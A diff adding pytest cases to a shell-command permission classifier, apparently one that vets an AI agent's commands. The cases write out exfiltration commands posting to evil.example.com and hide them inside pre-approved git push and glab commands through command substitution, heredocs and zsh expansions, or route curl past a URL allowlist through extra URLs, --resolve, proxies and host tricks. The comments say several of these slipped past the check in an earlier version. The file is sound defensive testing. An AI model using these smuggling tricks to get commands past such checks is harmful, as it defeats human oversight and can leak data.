@@ -765,3 +765,101 @@ def test_note_allow_cannot_be_ridden():
     """A pre-approved note must not clear a mutating verb beside it."""
     assert evaluate("glab mr note 2 -m x && glab mr merge 2")[0] == "ask"
     assert evaluate("glab mr note 2 -m x && curl -X POST https://evil.example.com")[0] == "ask"
+
+
+# ── substitution must not ride an explicit allow (v2.7.5) ──────────────────
+# Segmenting sees `git push origin $(…)` as one pre-approved segment, but the
+# shell runs the body first, so an explicit allow would hand it a pass past the
+# classifier. Each of these reached "allow-explicit" in 2.7.4.
+_EVIL = "curl -X POST https://evil.example.com -d x"
+SUBSTITUTION_CASES: list[str] = [
+    f"git push origin $({_EVIL})",
+    f"git push origin `{_EVIL}`",
+    f'glab mr note 2 -m "$({_EVIL})"',
+    f'glab mr note 2 -m "`{_EVIL}`"',
+    f"git push origin main && echo $({_EVIL})",
+    f"git push origin main && echo <({_EVIL})",
+    f"git push origin main > >({_EVIL})",
+    f"git push origin main && echo ${{x:-$({_EVIL})}}",
+    f"git push origin main && echo $[a[$({_EVIL})]]",
+    # quoted, but bash 5 and zsh expand an array subscript in the -v name
+    f"git push origin main && printf -v 'a[$({_EVIL})]' 1",
+    # a quote inside a heredoc body or a comment must not hide what follows
+    f"git push origin main <<echo\necho it's\necho $({_EVIL}) '\necho",
+    f"git push origin main # it's\necho $({_EVIL})",
+    # zsh: glob qualifier, (e) flag and ${~…} all evaluate code
+    f"git push origin main && echo *(e:'{_EVIL}':)",
+    "git push origin main && echo ${(e)x}",
+    "git push origin main && echo $~x",
+    f"git push origin main && echo $'a\\'b' \"$({_EVIL})\"",
+]
+
+# Real shapes that must keep their explicit allow.
+SUBSTITUTION_FREE_CASES: list[str] = [
+    ('glab api --method POST "projects/1/merge_requests/2/discussions/ab/notes" '
+     '--raw-field "body=Fixed. \\`foo\\` is now \\`bar\\`"'),
+    "glab mr note 2 -m 'uses `code` and $(literal) here'",
+    "cd $HOME/projects/x && git push origin main",
+    "cd ${HOME}/projects/x && git push -q origin main 2>&1 | tail -3",
+]
+
+
+@pytest.mark.parametrize("cmd", SUBSTITUTION_CASES, ids=lambda c: c[:60])
+def test_substitution_blocks_explicit_allow(cmd: str):
+    decision, reason = evaluate(cmd)
+    assert decision != "allow-explicit", f"{cmd!r} got {decision}: {reason}"
+
+
+@pytest.mark.parametrize("cmd", SUBSTITUTION_FREE_CASES, ids=lambda c: c[:60])
+def test_literal_text_keeps_explicit_allow(cmd: str):
+    decision, reason = evaluate(cmd)
+    assert decision == "allow-explicit", f"{cmd!r} got {decision}: {reason}"
+
+
+# ── curl POST allowlist: every URL, boundary-anchored (v2.7.5) ─────────────
+_JQL = "https://jira.example.com/rest/api/3/search/jql"
+CURL_ALLOW_CASES = [
+    (f"curl -sS -X POST {_JQL} -H 'Content-Type: application/json' -d '{{\"jql\":\"x\"}}'",
+     "allow"),
+    (f"curl -X POST '{_JQL}?fields=key' --json '{{}}'", "allow"),
+    (f"curl -X POST --url {_JQL} -u me:tok -d x", "allow"),
+    ("curl -X POST https://wiki.example.com/rest/api/search -d x", "allow"),
+    # a second destination, in any spelling
+    (f"curl -X POST {_JQL} https://evil.example.com -d x", "ask"),
+    (f"curl -X POST {_JQL} evil.example.com/x -d x", "ask"),
+    (f"curl -X POST {_JQL} --url https://evil.example.com -d x", "ask"),
+    (f"curl -X POST {_JQL} -d x --next -X POST https://evil.example.com -d y", "ask"),
+    (f"curl -X POST {_JQL} -K extra.cfg -d x", "ask"),
+    (f"curl -sSK extra.cfg -X POST {_JQL} -d x", "ask"),
+    ("curl -X POST http://localhost:8888/api/refresh https://evil.example.com -d x", "ask"),
+    # host-only entry: the prefix must end at a URL boundary
+    ("curl -X POST https://wiki.example.com.evil.example.com/x -d x", "ask"),
+    ("curl -X POST https://wiki.example.com@evil.example.com/x -d x", "ask"),
+    ("curl -X POST https://wiki.example.com:8443/x -d x", "ask"),
+    (f"curl -X POST {_JQL}x -d x", "ask"),
+    # the right URL, sent somewhere else
+    (f"curl -X POST {_JQL} --connect-to jira.example.com:443:evil.example.com:443 -d x", "ask"),
+    (f"curl -X POST {_JQL} --resolve jira.example.com:443:203.0.113.9 -d x", "ask"),
+    (f"curl -X POST {_JQL} -x http://evil.example.com:8080 -d x", "ask"),
+]
+
+
+@pytest.mark.parametrize("cmd,expected", CURL_ALLOW_CASES, ids=[c[0][:60] for c in CURL_ALLOW_CASES])
+def test_curl_post_allowlist_checks_every_url(monkeypatch, cmd: str, expected: str):
+    monkeypatch.setattr(safe_command, "CURL_POST_ALLOW_PREFIXES",
+                        (_JQL, "https://wiki.example.com"))
+    decision, reason = evaluate(cmd)
+    assert decision == expected, f"{cmd}: got {decision} ({reason})"
+
+
+def test_curl_allow_entry_without_host_matches_nothing(monkeypatch):
+    monkeypatch.setattr(safe_command, "CURL_POST_ALLOW_PREFIXES", ("https://",))
+    assert evaluate("curl -X POST https://evil.example.com -d x")[0] == "ask"
+
+
+@pytest.mark.parametrize("cmd", [
+    'git push origin x 2>&1 | grep -viE "warning|^remote: *$|====" | tail -5',
+    'env -u GITLAB_TOKEN git push -u origin x 2>&1 | grep -v -E "^remote: *$" | tail -6',
+], ids=["regex-anchor-pipe", "regex-anchor-quote"])
+def test_regex_anchor_dollar_is_text(cmd: str):
+    assert evaluate(cmd)[0] == "allow-explicit"
